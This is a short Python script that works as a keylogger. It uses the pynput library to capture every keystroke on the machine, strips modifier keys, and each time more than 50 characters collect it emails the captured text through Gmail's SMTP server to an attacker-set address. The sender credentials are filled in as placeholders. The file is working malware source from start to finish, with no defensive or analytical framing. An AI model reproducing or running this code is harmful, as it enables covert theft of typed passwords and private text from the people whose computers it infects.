from pynput.keyboard import Key, Listener
import smtplib, ssl

sender_address = 'SENDERMAIL'
sender_pass = 'SENDERPASS'
receiver_address = 'RECVMAIL'

full_text = ''

keys = [Key.shift_l, Key.shift_r, Key.ctrl_l, Key.ctrl_r, Key.alt_gr, Key.alt_l, Key.alt_r]

context = ssl.create_default_context()
server = smtplib.SMTP('smtp.gmail.com', 587)

server.ehlo()
server.starttls(context=context)
server.ehlo()
server.login(sender_address, sender_pass)

def send_email():
    server.sendmail(sender_address, receiver_address, full_text)

def on_press(key):
    global full_text
    if key == Key.space or key == Key.tab:
        word = ' '
        full_text += word
    elif key == Key.esc:
        return False
    elif key == Key.enter:
        word = '\n'
        full_text += word
    elif key in keys:
        return
    elif key == Key.backspace:
        full_text = full_text[0:-1]
    else:
        word = f'{key}'
        word = word[1:-1]
        full_text += word
    if len(full_text) > 50:
        send_email()
        full_text = ''

with Listener(on_press=on_press) as listener:
    listener.join()


 
